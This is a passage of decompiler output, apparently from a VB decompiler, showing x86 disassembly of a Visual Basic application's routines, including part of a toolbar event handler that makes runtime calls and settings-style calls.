  '00504C97: push edx
  '00504C98: lea eax, [ebp-48h]
  '00504C9B: push 00000040h
  '00504C9D: push eax
  '00504C9E: call [004010E0h]
  '00504CA4: lea ecx, [ebp-78h]
  '00504CA7: lea edx, [ebp-68h]
  '00504CAA: push ecx
  '00504CAB: lea eax, [ebp-58h]
  '00504CAE: push edx
  '00504CAF: lea ecx, [ebp-48h]
  '00504CB2: push eax
  '00504CB3: push ecx
  '00504CB4: push 00000004h
  '00504CB6: call [00401050h]
  '00504CBC: add esp, 00000014h
  '00504CBF: mov [ebp-04h], edi
  '00504CC2: wait 
  '00504CC3: push 00504FE2h
  '00504CC8: jmp 00504FCEh
  '00504CCD: mov edx, [esi]
  '00504CCF: push esi
  '00504CD0: call [edx+000002B4h]
  '00504CD6: cmp eax, edi
  '00504CD8: fclex 
  '00504CDA: jnl 504CEEh
  '00504CDC: push 000002B4h
  '00504CE1: push 00422CA4h
  '00504CE6: push esi
  '00504CE7: push eax
  '00504CE8: call [004010A0h]
  '00504CEE: mov eax, [esi]
  '00504CF0: push esi
  '00504CF1: call [eax+0000030Ch]
  '00504CF7: lea ecx, [ebp-38h]
  '00504CFA: push eax
  '00504CFB: push ecx
  '00504CFC: call [004010E4h]
  '00504D02: mov ebx, eax
  '00504D04: lea eax, [ebp-000000BCh]
  '00504D0A: push eax
  '00504D0B: push ebx
  '00504D0C: mov edx, [ebx]
  '00504D0E: call [edx+000000D8h]
  '00504D14: cmp eax, edi
  '00504D16: fclex 
  '00504D18: jnl 504D2Ch
  '00504D1A: push 000000D8h
  '00504D1F: push 0041FB8Ch
  '00504D24: push ebx
  '00504D25: push eax
  '00504D26: call [004010A0h]
  '00504D2C: mov cx, [ebp-000000BCh]
  '00504D33: sub cx, 0001h
  '00504D37: jo 00505001h
  '00504D3D: movsx edx, cx
  '00504D40: xor ebx, ebx
  '00504D42: lea ecx, [ebp-38h]
  '00504D45: mov [ebp-000000E0h], edx
  '00504D4B: mov [ebp-18h], ebx
  '00504D4E: call [004013B8h]
  '00504D54: cmp ebx, [ebp-000000E0h]
  '00504D5A: jnle 00504CBFh
  '00504D60: cmp [00541024h], edi
  '00504D66: jnz 504D78h
  '00504D68: push 00541024h
  '00504D6D: push 00413334h
  '00504D72: call [004012B8h]
  '00504D78: mov eax, [541024h]
  '00504D7D: lea ecx, [ebp-000000D0h]
  '00504D83: push eax
  '00504D84: push ecx
  '00504D85: call [004010F8h]
  '00504D8B: mov eax, [ebp-000000D0h]
  '00504D91: push eax
  '00504D92: mov edx, [eax]
  '00504D94: call [edx+00000324h]
  '00504D9A: push eax
  '00504D9B: lea eax, [ebp-38h]
  '00504D9E: push eax
  '00504D9F: call [004010E4h]
  '00504DA5: mov ecx, [esi+34h]
  '00504DA8: lea edx, [ebp-28h]
  '00504DAB: push edx
  '00504DAC: mov [ebp-000000C4h], eax
  '00504DB2: mov edi, [ecx]
  '00504DB4: mov ecx, ebx
  '00504DB6: add ecx, 00000001h
  '00504DB9: jo 00505001h
  '00504DBF: call [004011A8h]
  '00504DC5: push eax
  '00504DC6: mov eax, [esi+34h]
  '00504DC9: push eax
  '00504DCA: call [edi+20h]
  '00504DCD: test eax, eax
  '00504DCF: fclex 
  '00504DD1: jnl 504DE5h
  '00504DD3: mov ecx, [esi+34h]
  '00504DD6: push 00000020h
  '00504DD8: push 004289C8h
  '00504DDD: push ecx
  '00504DDE: push eax
  '00504DDF: call [004010A0h]
  '00504DE5: mov edi, [ebp-000000C4h]
  '00504DEB: mov eax, [ebp-28h]
  '00504DEE: push eax
  '00504DEF: push edi
  '00504DF0: mov edx, [edi]
  '00504DF2: call [edx+000000A4h]
  '00504DF8: test eax, eax
  '00504DFA: fclex 
  '00504DFC: jnl 504E10h
  '00504DFE: push 000000A4h
  '00504E03: push 0041E3FCh
  '00504E08: push edi
  '00504E09: push eax
  '00504E0A: call [004010A0h]
  '00504E10: lea ecx, [ebp-28h]
  '00504E13: call [004013B4h]
  '00504E19: lea ecx, [ebp-38h]
  '00504E1C: call [004013B8h]
  '00504E22: mov eax, [ebp-000000D0h]
  '00504E28: push eax
  '00504E29: mov ecx, [eax]
  '00504E2B: call [ecx+00000328h]
  '00504E31: lea edx, [ebp-38h]
  '00504E34: push eax
  '00504E35: push edx
  '00504E36: call [004010E4h]
  '00504E3C: lea ecx, [ebp-28h]
  '00504E3F: mov edi, eax
  '00504E41: mov eax, [esi+34h]
  '00504E44: push ecx
  '00504E45: mov ecx, ebx
  '00504E47: mov edx, [eax]
  '00504E49: add ecx, 00000001h
  '00504E4C: jo 00505001h
  '00504E52: mov [ebp-00000100h], edx
  '00504E58: call [004011A8h]
  '00504E5E: mov edx, [esi+34h]
  '00504E61: push eax
  '00504E62: mov eax, [ebp-00000100h]
  '00504E68: push edx
  '00504E69: call [eax+28h]
  '00504E6C: test eax, eax
  '00504E6E: fclex 
  '00504E70: jnl 504E84h
  '00504E72: mov ecx, [esi+34h]
  '00504E75: push 00000028h
  '00504E77: push 004289C8h
  '00504E7C: push ecx
  '00504E7D: push eax
  '00504E7E: call [004010A0h]
  '00504E84: mov eax, [ebp-28h]
  '00504E87: mov edx, [edi]
  '00504E89: push eax
  '00504E8A: push edi
  '00504E8B: call [edx+000000A4h]
  '00504E91: test eax, eax
  '00504E93: fclex 
  '00504E95: jnl 504EA9h
  '00504E97: push 000000A4h
  '00504E9C: push 0041E3FCh
  '00504EA1: push edi
  '00504EA2: push eax
  '00504EA3: call [004010A0h]
  '00504EA9: mov ebx, [004013B4h]
  '00504EAF: lea ecx, [ebp-28h]
  '00504EB2: call ebx
  '00504EB4: lea ecx, [ebp-38h]
  '00504EB7: call [004013B8h]
  '00504EBD: mov eax, [ebp-000000D0h]
  '00504EC3: push eax
  '00504EC4: mov ecx, [eax]
  '00504EC6: call [ecx+00000744h]
  '00504ECC: test eax, eax
  '00504ECE: fclex 
  '00504ED0: jnl 504EEAh
  '00504ED2: mov edx, [ebp-000000D0h]
  '00504ED8: push 00000744h
  '00504EDD: push 0041C118h
  '00504EE2: push edx
  '00504EE3: push eax
  '00504EE4: call [004010A0h]
  '00504EEA: lea eax, [ebp-000000D0h]
  '00504EF0: push 00000000h
  '00504EF2: push eax
  '00504EF3: call [004010F8h]
  '00504EF9: mov ecx, [esi]
  '00504EFB: push esi
  '00504EFC: call [ecx+000002FCh]
  '00504F02: lea edx, [ebp-38h]
  '00504F05: push eax
  '00504F06: push edx
  '00504F07: call [004010E4h]
  '00504F0D: mov edi, eax
  '00504F0F: lea ecx, [ebp-28h]
  '00504F12: push ecx
  '00504F13: push edi
  '00504F14: mov eax, [edi]
  '00504F16: call [eax+000000A0h]
  '00504F1C: test eax, eax
  '00504F1E: fclex 
  '00504F20: jnl 504F34h
  '00504F22: push 000000A0h
  '00504F27: push 0041E3FCh
  '00504F2C: push edi
  '00504F2D: push eax
  '00504F2E: call [004010A0h]
  '00504F34: mov edx, [ebp-28h]
  '00504F37: push edx
  '00504F38: call [004013BCh]
  '00504F3E: fstp real8 ptr [ebp-40h]
  '00504F41: lea eax, [ebp-48h]
  '00504F44: lea ecx, [ebp-58h]
  '00504F47: push eax
  '00504F48: push ecx
  '00504F49: mov [ebp-48h], 00000005h
  '00504F50: call 0052DE80h
  '00504F55: lea ecx, [ebp-28h]
  '00504F58: call ebx
  '00504F5A: lea ecx, [ebp-38h]
  '00504F5D: call [004013B8h]
  '00504F63: lea edx, [ebp-58h]
  '00504F66: lea eax, [ebp-48h]
  '00504F69: push edx
  '00504F6A: push eax
  '00504F6B: push 00000002h
  '00504F6D: call [00401050h]
  '00504F73: mov ecx, [ebp-18h]
  '00504F76: mov eax, 00000001h
  '00504F7B: add esp, 0000000Ch
  '00504F7E: add eax, ecx
  '00504F80: jo 504F01h
  '00504F82: mov ebx, eax
  '00504F84: xor edi, edi
  '00504F86: mov [ebp-18h], ebx
  '00504F89: jmp 00504D54h
  '00504F8E: lea ecx, [ebp-34h]
  '00504F91: lea edx, [ebp-30h]
  '00504F94: push ecx
  '00504F95: lea eax, [ebp-2Ch]
  '00504F98: push edx
  '00504F99: lea ecx, [ebp-28h]
  '00504F9C: push eax
  '00504F9D: push ecx
  '00504F9E: push 00000004h
  '00504FA0: call [004012E8h]
  '00504FA6: add esp, 00000014h
  '00504FA9: lea ecx, [ebp-38h]
  '00504FAC: call [004013B8h]
  '00504FB2: lea edx, [ebp-78h]
  '00504FB5: lea eax, [ebp-68h]
  '00504FB8: push edx
  '00504FB9: lea ecx, [ebp-58h]
  '00504FBC: push eax
  '00504FBD: lea edx, [ebp-48h]
  '00504FC0: push ecx
  '00504FC1: push edx
  '00504FC2: push 00000004h
  '00504FC4: call [00401050h]
  '00504FCA: add esp, 00000014h
  '00504FCD: ret 
End Sub
Private Sub Toolbar1__505BC0
  '00505BC0: push ebp
  '00505BC1: mov ebp, esp
  '00505BC3: sub esp, 00000018h
  '00505BC6: push 004081B6h
  '00505BCB: mov eax, fs:[00h]
  '00505BD1: push eax
  '00505BD2: mov fs:[00000000h], esp
  '00505BD9: mov eax, 00000154h
  '00505BDE: call 004081B0h
  '00505BE3: push ebx
  '00505BE4: push esi
  '00505BE5: push edi
  '00505BE6: mov [ebp-18h], esp
  '00505BE9: mov [ebp-14h], 004060F0h
  '00505BF0: mov eax, [ebp+08h]
  '00505BF3: and eax, 00000001h
  '00505BF6: mov [ebp-10h], eax
  '00505BF9: mov ecx, [ebp+08h]
  '00505BFC: and ecx, FFFFFFFEh
  '00505BFF: mov [ebp+08h], ecx
  '00505C02: mov [ebp-0Ch], 00000000h
  '00505C09: mov edx, [ebp+08h]
  '00505C0C: mov eax, [edx]
  '00505C0E: mov ecx, [ebp+08h]
  '00505C11: push ecx
  '00505C12: call [eax+04h]
  '00505C15: mov [ebp-04h], 00000001h
  '00505C1C: mov edx, [ebp+0Ch]
  '00505C1F: push edx
  '00505C20: lea eax, [ebp-24h]
  '00505C23: push eax
  '00505C24: call [004010F8h]
  '00505C2A: mov [ebp-04h], 00000002h
  '00505C31: push FFFFFFFFh
  '00505C33: call [004010E8h]
  '00505C39: mov [ebp-04h], 00000003h
  '00505C40: lea ecx, [ebp-3Ch]
  '00505C43: push ecx
  '00505C44: mov edx, [ebp-24h]
  '00505C47: mov eax, [edx]
  '00505C49: mov ecx, [ebp-24h]
  '00505C4C: push ecx
  '00505C4D: call [eax+4Ch]
  '00505C50: fclex 
  '00505C52: mov [ebp-0000012Ch], eax
  '00505C58: cmp [ebp-0000012Ch], 00000000h
  '00505C5F: jnl 505C81h
  '00505C61: push 0000004Ch
  '00505C63: push 00422C68h
  '00505C68: mov edx, [ebp-24h]
  '00505C6B: push edx
  '00505C6C: mov eax, [ebp-0000012Ch]
  '00505C72: push eax
  '00505C73: call [004010A0h]
  '00505C79: mov [ebp-0000015Ch], eax
  '00505C7F: jmp 505C8Bh
  '00505C81: mov [ebp-0000015Ch], 00000000h
  '00505C8B: mov ecx, [ebp-3Ch]
  '00505C8E: mov [ebp-00000150h], ecx
  '00505C94: mov [ebp-3Ch], 00000000h
  '00505C9B: mov edx, [ebp-00000150h]
  '00505CA1: mov [ebp-48h], edx
  '00505CA4: mov [ebp-50h], 00000008h
  '00505CAB: lea eax, [ebp-50h]
  '00505CAE: push eax
  '00505CAF: lea ecx, [ebp-60h]
  '00505CB2: push ecx
  '00505CB3: call [00401174h]
  '00505CB9: mov [ebp-000000B8h], 00428E4Ch
  '00505CC3: mov [ebp-000000C0h], 00008008h
  '00505CCD: lea edx, [ebp-60h]
  '00505CD0: push edx
  '00505CD1: lea eax, [ebp-000000C0h]
  '00505CD7: push eax
  '00505CD8: call [00401198h]
  '00505CDE: mov [ebp-00000130h], ax
  '00505CE5: lea ecx, [ebp-60h]
  '00505CE8: push ecx
  '00505CE9: lea edx, [ebp-50h]
  '00505CEC: push edx
  '00505CED: push 00000002h
  '00505CEF: call [00401050h]
  '00505CF5: add esp, 0000000Ch
  '00505CF8: movsx eax, word ptr [ebp-00000130h]
  '00505CFF: test eax, eax
  '00505D01: jz 00506370h
  '00505D07: mov [ebp-04h], 00000004h
  '00505D0E: mov [ebp-000000A8h], 80020004h
  '00505D18: mov [ebp-000000B0h], 0000000Ah
  '00505D22: mov [ebp-00000098h], 80020004h
  '00505D2C: mov [ebp-000000A0h], 0000000Ah
  '00505D36: mov [ebp-00000088h], 000003E8h
  '00505D40: mov [ebp-00000090h], 00000002h
  '00505D4A: mov [ebp-78h], 000003E8h
  '00505D51: mov [ebp-80h], 00000002h
  '00505D58: mov [ebp-000000D8h], 00428ECCh
  '00505D62: mov [ebp-000000E0h], 00000008h
  '00505D6C: lea edx, [ebp-000000E0h]
  '00505D72: lea ecx, [ebp-70h]
  '00505D75: call [00401338h]
  '00505D7B: mov [ebp-000000C8h], 004220B0h
  '00505D85: mov [ebp-000000D0h], 00000008h
  '00505D8F: lea edx, [ebp-000000D0h]
  '00505D95: lea ecx, [ebp-60h]
  '00505D98: call [00401338h]
  '00505D9E: mov [ebp-000000B8h], 00428E78h
  '00505DA8: mov [ebp-000000C0h], 00000008h
  '00505DB2: lea edx, [ebp-000000C0h]
  '00505DB8: lea ecx, [ebp-50h]
  '00505DBB: call [00401338h]
  '00505DC1: lea ecx, [ebp-000000B0h]
  '00505DC7: push ecx
  '00505DC8: lea edx, [ebp-000000A0h]
  '00505DCE: push edx
  '00505DCF: lea eax, [ebp-00000090h]
  '00505DD5: push eax
  '00505DD6: lea ecx, [ebp-80h]
  '00505DD9: push ecx
  '00505DDA: lea edx, [ebp-70h]
  '00505DDD: push edx
  '00505DDE: lea eax, [ebp-60h]
  '00505DE1: push eax
  '00505DE2: lea ecx, [ebp-50h]
  '00505DE5: push ecx
  '00505DE6: call [004010ECh]
  '00505DEC: mov edx, eax
  '00505DEE: lea ecx, [ebp-28h]
  '00505DF1: call [00401378h]
  '00505DF7: lea edx, [ebp-000000B0h]
  '00505DFD: push edx
  '00505DFE: lea eax, [ebp-000000A0h]
  '00505E04: push eax
  '00505E05: lea ecx, [ebp-00000090h]
  '00505E0B: push ecx
  '00505E0C: lea edx, [ebp-80h]
  '00505E0F: push edx
  '00505E10: lea eax, [ebp-70h]
  '00505E13: push eax
  '00505E14: lea ecx, [ebp-60h]
  '00505E17: push ecx
  '00505E18: lea edx, [ebp-50h]
  '00505E1B: push edx
  '00505E1C: push 00000007h
  '00505E1E: call [00401050h]
  '00505E24: add esp, 00000020h
  '00505E27: mov [ebp-04h], 00000005h
  '00505E2E: mov eax, [ebp-28h]
  '00505E31: push eax
  '00505E32: push 0041BC60h
  '00505E37: call [00401184h]
  '00505E3D: test eax, eax
  '00505E3F: jnz 505E46h
  '00505E41: jmp 005066FCh
  '00505E46: mov [ebp-04h], 00000008h
  '00505E4D: lea ecx, [ebp-28h]
  '00505E50: mov [ebp-000000B8h], ecx
  '00505E56: mov [ebp-000000C0h], 00004008h
  '00505E60: lea edx, [ebp-000000C0h]
  '00505E66: push edx
  '00505E67: lea eax, [ebp-50h]
  '00505E6A: push eax
  '00505E6B: call [00401074h]
  '00505E71: mov [ebp-000000C8h], 00428A54h
  '00505E7B: mov [ebp-000000D0h], 00000008h
  '00505E85: mov [ebp-000000D8h], 00000000h
  '00505E8F: mov [ebp-000000E0h], 00008002h
  '00505E99: push 00000001h
  '00505E9B: lea ecx, [ebp-50h]
  '00505E9E: push ecx
  '00505E9F: lea edx, [ebp-000000D0h]
  '00505EA5: push edx
  '00505EA6: push 00000000h
  '00505EA8: lea eax, [ebp-60h]
  '00505EAB: push eax
  '00505EAC: call [00401260h]
  '00505EB2: push eax
  '00505EB3: lea ecx, [ebp-000000E0h]
  '00505EB9: push ecx
  '00505EBA: call [00401198h]
  '00505EC0: mov [ebp-0000012Ch], ax
  '00505EC7: lea edx, [ebp-60h]
  '00505ECA: push edx
  '00505ECB: lea eax, [ebp-50h]
  '00505ECE: push eax
  '00505ECF: push 00000002h
  '00505ED1: call [00401050h]
  '00505ED7: add esp, 0000000Ch
  '00505EDA: movsx ecx, word ptr [ebp-0000012Ch]
  '00505EE1: test ecx, ecx
  '00505EE3: jz 00505F91h
  '00505EE9: mov [ebp-04h], 00000009h
  '00505EF0: push 00428F04h
  '00505EF5: push 0041F414h
  '00505EFA: call [0040108Ch]
  '00505F00: mov edx, eax
  '00505F02: lea ecx, [ebp-3Ch]
  '00505F05: call [00401378h]
  '00505F0B: push eax
  '00505F0C: push 00428F74h
  '00505F11: call [0040108Ch]
  '00505F17: mov edx, eax
  '00505F19: lea ecx, [ebp-40h]
  '00505F1C: call [00401378h]
  '00505F22: lea edx, [ebp-00000124h]
  '00505F28: push edx
  '00505F29: lea eax, [ebp-40h]
  '00505F2C: push eax
  '00505F2D: mov ecx, [ebp+08h]
  '00505F30: mov edx, [ecx]
  '00505F32: mov eax, [ebp+08h]
  '00505F35: push eax
  '00505F36: call [edx+0000072Ch]
  '00505F3C: xor ecx, ecx
  '00505F3E: cmp word ptr [ebp-00000124h], FFFFh
  '00505F46: setz cl
  '00505F49: neg ecx
  '00505F4B: mov [ebp-0000012Ch], cx
  '00505F52: lea edx, [ebp-40h]
  '00505F55: push edx
  '00505F56: lea eax, [ebp-3Ch]
  '00505F59: push eax
  '00505F5A: push 00000002h
  '00505F5C: call [004012E8h]
  '00505F62: add esp, 0000000Ch
  '00505F65: movsx ecx, word ptr [ebp-0000012Ch]
  '00505F6C: test ecx, ecx
  '00505F6E: jz 505F91h
  '00505F70: mov [ebp-04h], 0000000Ah
  '00505F77: push 00428A54h
  '00505F7C: mov edx, [ebp-28h]
  '00505F7F: push edx
  '00505F80: call [0040108Ch]
  '00505F86: mov edx, eax
  '00505F88: lea ecx, [ebp-28h]
  '00505F8B: call [00401378h]
  '00505F91: mov [ebp-04h], 0000000Dh
  '00505F98: mov [ebp-000000B8h], 80020004h
  '00505FA2: mov [ebp-000000C0h], 0000000Ah
  '00505FAC: mov eax, 00000010h
  '00505FB1: call 004081B0h
  '00505FB6: mov eax, esp
  '00505FB8: mov ecx, [ebp-000000C0h]
  '00505FBE: mov [eax], ecx
  '00505FC0: mov edx, [ebp-000000BCh]
  '00505FC6: mov [eax+04h], edx
  '00505FC9: mov ecx, [ebp-000000B8h]
  '00505FCF: mov [eax+08h], ecx
  '00505FD2: mov edx, [ebp-000000B4h]
  '00505FD8: mov [eax+0Ch], edx
  '00505FDB: push 00428DBCh
  '00505FE0: push 00428DA4h
  '00505FE5: push 0041DA1Ch
  '00505FEA: call [00401314h]
  '00505FF0: mov edx, eax
  '00505FF2: lea ecx, [ebp-38h]
  '00505FF5: call [00401378h]
  '00505FFB: mov [ebp-04h], 0000000Eh
  '00506002: mov eax, [ebp-38h]
  '00506005: push eax
  '00506006: push 0041BC60h
  '0050600B: call [00401184h]
  '00506011: test eax, eax
  '00506013: jz 00506281h
  '00506019: mov [ebp-04h], 0000000Fh
  '00506020: mov [ebp-000000B8h], 0041DE10h
  '0050602A: mov [ebp-000000C0h], 00000008h
  '00506034: lea edx, [ebp-000000C0h]
  '0050603A: lea ecx, [ebp-50h]
  '0050603D: call [00401338h]
  '00506043: push 00000000h
  '00506045: push FFFFFFFFh
  '00506047: lea ecx, [ebp-50h]
  '0050604A: push ecx
  '0050604B: mov edx, [ebp-38h]
  '0050604E: push edx
  '0050604F: lea eax, [ebp-60h]
  '00506052: push eax
  '00506053: call [0040122Ch]
  '00506059: lea ecx, [ebp-60h]
  '0050605C: push ecx
  '0050605D: push 00002008h
  '00506062: call [004010B0h]
  '00506068: mov [ebp-00000128h], eax
  '0050606E: lea edx, [ebp-00000128h]
  '00506074: push edx
  '00506075: lea eax, [ebp-2Ch]
  '00506078: push eax
  '00506079: call [00401374h]
  '0050607F: lea ecx, [ebp-60h]
  '00506082: push ecx
  '00506083: lea edx, [ebp-50h]
  '00506086: push edx
  '00506087: push 00000002h
  '00506089: call [00401050h]
  '0050608F: add esp, 0000000Ch
  '00506092: mov [ebp-04h], 00000010h
  '00506099: mov eax, [ebp-2Ch]
  '0050609C: push eax
  '0050609D: push 00000001h
  '0050609F: call [00401268h]
  '005060A5: mov ecx, eax
  '005060A7: call [004011A8h]
  '005060AD: mov [ebp-00000138h], ax
  '005060B4: mov word ptr [ebp-00000134h], 0001h
  '005060BD: mov ecx, [ebp-2Ch]
  '005060C0: push ecx
  '005060C1: push 00000001h
  '005060C3: call [004011D0h]
  '005060C9: mov ecx, eax
  '005060CB: call [004011A8h]
  '005060D1: mov [ebp-34h], ax
  '005060D5: jmp 5060ECh
  '005060D7: mov dx, [ebp-34h]
  '005060DB: add dx, [ebp-00000134h]
  '005060E2: jo 005067A1h
  '005060E8: mov [ebp-34h], dx
  '005060EC: mov ax, [ebp-34h]
  '005060F0: cmp ax, [ebp-00000138h]
  '005060F7: jnle 00506281h
  '005060FD: mov [ebp-04h], 00000011h
  '00506104: cmp [ebp-2Ch], 00000000h
  '00506108: jz 50615Ah
  '0050610A: mov ecx, [ebp-2Ch]
  '0050610D: cmp word ptr [ecx], 0001h
  '00506111: jnz 50615Ah
  '00506113: movsx edx, word ptr [ebp-34h]
  '00506117: mov eax, [ebp-2Ch]
  '0050611A: sub edx, [eax+14h]
  '0050611D: mov [ebp-0000012Ch], edx
  '00506123: mov ecx, [ebp-2Ch]
  '00506126: mov edx, [ebp-0000012Ch]
  '0050612C: cmp edx, [ecx+10h]
  '0050612F: jnb 50613Dh
  '00506131: mov [ebp-00000160h], 00000000h
  '0050613B: jmp 506149h
  '0050613D: call [00401178h]
  '00506143: mov [ebp-00000160h], eax
  '00506149: mov eax, [ebp-0000012Ch]
  '0050614F: shl eax, 02h
  '00506152: mov [ebp-00000164h], eax
  '00506158: jmp 506166h
  '0050615A: call [00401178h]
  '00506160: mov [ebp-00000164h], eax
  '00506166: mov ecx, [ebp-2Ch]
  '00506169: mov edx, [ecx+0Ch]
  '0050616C: mov eax, [ebp-00000164h]
  '00506172: mov ecx, [edx+eax]
  '00506175: push ecx
  '00506176: call [0040107Ch]
  '0050617C: mov edx, eax
  '0050617E: lea ecx, [ebp-3Ch]
  '00506181: call [00401378h]
  '00506187: push eax
  '00506188: mov edx, [ebp-28h]
  '0050618B: push edx
  '0050618C: call [0040107Ch]
  '00506192: mov edx, eax
  '00506194: lea ecx, [ebp-40h]
  '00506197: call [00401378h]
  '0050619D: push eax
  '0050619E: call [00401184h]
  '005061A4: neg eax
  '005061A6: sbb eax, eax
  '005061A8: inc eax
  '005061A9: neg eax
  '005061AB: mov [ebp-00000130h], ax
  '005061B2: lea eax, [ebp-40h]
  '005061B5: push eax
  '005061B6: lea ecx, [ebp-3Ch]
  '005061B9: push ecx
  '005061BA: push 00000002h
  '005061BC: call [004012E8h]
  '005061C2: add esp, 0000000Ch
  '005061C5: movsx edx, word ptr [ebp-00000130h]
  '005061CC: test edx, edx
  '005061CE: jz 00506275h
  '005061D4: mov [ebp-04h], 00000012h
  '005061DB: mov [ebp-78h], 80020004h
  '005061E2: mov [ebp-80h], 0000000Ah
  '005061E9: mov [ebp-68h], 80020004h
  '005061F0: mov [ebp-70h], 0000000Ah
  '005061F7: mov [ebp-000000C8h], 00429054h
  '00506201: mov [ebp-000000D0h], 00000008h
  '0050620B: lea edx, [ebp-000000D0h]
  '00506211: lea ecx, [ebp-60h]
  '00506214: call [00401338h]
  '0050621A: mov [ebp-000000B8h], 00428FD0h
  '00506224: mov [ebp-000000C0h], 00000008h
  '0050622E: lea edx, [ebp-000000C0h]
  '00506234: lea ecx, [ebp-50h]
  '00506237: call [00401338h]
  '0050623D: lea eax, [ebp-80h]
  '00506240: push eax
  '00506241: lea ecx, [ebp-70h]
  '00506244: push ecx
  '00506245: lea edx, [ebp-60h]
  '00506248: push edx
  '00506249: push 00000010h
  '0050624B: lea eax, [ebp-50h]
  '0050624E: push eax
  '0050624F: call [004010E0h]
  '00506255: lea ecx, [ebp-80h]
  '00506258: push ecx
  '00506259: lea edx, [ebp-70h]
  '0050625C: push edx
  '0050625D: lea eax, [ebp-60h]
  '00506260: push eax
  '00506261: lea ecx, [ebp-50h]
  '00506264: push ecx
  '00506265: push 00000004h
  '00506267: call [00401050h]
  '0050626D: add esp, 00000014h
  '00506270: jmp 005066FCh
  '00506275: mov [ebp-04h], 00000015h
  '0050627C: jmp 005060D7h
  '00506281: mov [ebp-04h], 00000017h
  '00506288: mov edx, [ebp-38h]
  '0050628B: push edx
  '0050628C: push 0041BC60h
  '00506291: call [00401184h]
  '00506297: mov esi, eax
  '00506299: neg esi
  '0050629B: sbb esi, esi
  '0050629D: neg esi
  '0050629F: neg esi
  '005062A1: push 00000001h
  '005062A3: mov eax, [ebp-38h]
  '005062A6: push eax
  '005062A7: call [00401380h]
  '005062AD: mov edx, eax
  '005062AF: lea ecx, [ebp-3Ch]
  '005062B2: call [00401378h]
  '005062B8: push eax
  '005062B9: push 0041DE10h
  '005062BE: call [00401184h]
  '005062C4: neg eax
  '005062C6: sbb eax, eax
  '005062C8: neg eax
  '005062CA: neg eax
  '005062CC: and si, ax
  '005062CF: mov [ebp-0000012Ch], si
  '005062D6: lea ecx, [ebp-3Ch]
  '005062D9: call [004013B4h]
  '005062DF: movsx ecx, word ptr [ebp-0000012Ch]
  '005062E6: test ecx, ecx
  '005062E8: jz 50630Bh
  '005062EA: mov [ebp-04h], 00000018h
  '005062F1: mov edx, [ebp-38h]
  '005062F4: push edx
  '005062F5: push 0041DE10h
  '005062FA: call [0040108Ch]
  '00506300: mov edx, eax
  '00506302: lea ecx, [ebp-38h]
  '00506305: call [00401378h]
  '0050630B: mov [ebp-04h], 0000001Ah
  '00506312: mov eax, [ebp-38h]
  '00506315: push eax
  '00506316: mov ecx, [ebp-28h]
  '00506319: push ecx
  '0050631A: call [0040108Ch]
  '00506320: mov edx, eax
  '00506322: lea ecx, [ebp-3Ch]
  '00506325: call [00401378h]
  '0050632B: push eax
  '0050632C: push 0041DE10h
  '00506331: call [0040108Ch]
  '00506337: mov edx, eax
  '00506339: lea ecx, [ebp-40h]
  '0050633C: call [00401378h]
  '00506342: push eax
  '00506343: push 00428DBCh
  '00506348: push 00428DA4h
  '0050634D: push 0041DA1Ch
  '00506352: call [00401010h]
  '00506358: lea edx, [ebp-40h]
  '0050635B: push edx
  '0050635C: lea eax, [ebp-3Ch]
  '0050635F: push eax
  '00506360: push 00000002h
  '00506362: call [004012E8h]
  '00506368: add esp, 0000000Ch
  '0050636B: jmp 005066FCh
  '00506370: mov [ebp-04h], 0000001Bh
  '00506377: lea ecx, [ebp-3Ch]
  '0050637A: push ecx
  '0050637B: mov edx, [ebp-24h]
  '0050637E: mov eax, [edx]
  '00506380: mov ecx, [ebp-24h]
  '00506383: push ecx
  '00506384: call [eax+4Ch]
  '00506387: fclex 
  '00506389: mov [ebp-0000012Ch], eax
  '0050638F: cmp [ebp-0000012Ch], 00000000h
  '00506396: jnl 5063B8h
  '00506398: push 0000004Ch
  '0050639A: push 00422C68h
  '0050639F: mov edx, [ebp-24h]
  '005063A2: push edx
  '005063A3: mov eax, [ebp-0000012Ch]
  '005063A9: push eax
  '005063AA: call [004010A0h]
  '005063B0: mov [ebp-00000168h], eax
  '005063B6: jmp 5063C2h
  '005063B8: mov [ebp-00000168h], 00000000h
  '005063C2: mov ecx, [ebp-3Ch]
  '005063C5: mov [ebp-00000154h], ecx
  '005063CB: mov [ebp-3Ch], 00000000h
  '005063D2: mov edx, [ebp-00000154h]
  '005063D8: mov [ebp-48h], edx
  '005063DB: mov [ebp-50h], 00000008h
  '005063E2: lea eax, [ebp-50h]
  '005063E5: push eax
  '005063E6: lea ecx, [ebp-60h]
  '005063E9: push ecx
  '005063EA: call [00401174h]
  '005063F0: mov [ebp-000000B8h], 0042906Ch
  '005063FA: mov [ebp-000000C0h], 00008008h
  '00506404: lea edx, [ebp-60h]
  '00506407: push edx
  '00506408: lea eax, [ebp-000000C0h]
  '0050640E: push eax
  '0050640F: call [00401198h]
  '00506415: mov [ebp-00000130h], ax
  '0050641C: lea ecx, [ebp-60h]
  '0050641F: push ecx
  '00506420: lea edx, [ebp-50h]
  '00506423: push edx
  '00506424: push 00000002h
  '00506426: call [00401050h]
  '0050642C: add esp, 0000000Ch
  '0050642F: movsx eax, word ptr [ebp-00000130h]
  '00506436: test eax, eax
  '00506438: jz 00506578h
  '0050643E: mov [ebp-04h], 0000001Ch
  '00506445: mov [ebp-000000B8h], 80020004h
  '0050644F: mov [ebp-000000C0h], 0000000Ah
  '00506459: mov eax, 00000010h
  '0050645E: call 004081B0h
  '00506463: mov ecx, esp
  '00506465: mov edx, [ebp-000000C0h]
  '0050646B: mov [ecx], edx
  '0050646D: mov eax, [ebp-000000BCh]
  '00506473: mov [ecx+04h], eax
  '00506476: mov edx, [ebp-000000B8h]
  '0050647C: mov [ecx+08h], edx
  '0050647F: mov eax, [ebp-000000B4h]
  '00506485: mov [ecx+0Ch], eax
  '00506488: push 00428DBCh
  '0050648D: push 00428DA4h
  '00506492: push 0041DA1Ch
  '00506497: call [00401314h]
  '0050649D: mov edx, eax
  '0050649F: lea ecx, [ebp-3Ch]
  '005064A2: call [00401378h]
  '005064A8: push eax
  '005064A9: push 0041BC60h
  '005064AE: call [00401184h]
  '005064B4: neg eax
  '005064B6: sbb eax, eax
  '005064B8: neg eax
  '005064BA: neg eax
  '005064BC: mov [ebp-0000012Ch], ax
  '005064C3: lea ecx, [ebp-3Ch]
  '005064C6: call [004013B4h]
  '005064CC: movsx ecx, word ptr [ebp-0000012Ch]
  '005064D3: test ecx, ecx
  '005064D5: jz 00506573h
  '005064DB: mov [ebp-04h], 0000001Dh
  '005064E2: mov [ebp-000000C8h], 00428DBCh
  '005064EC: mov [ebp-000000D0h], 00000008h
  '005064F6: mov [ebp-000000B8h], 00428DA4h
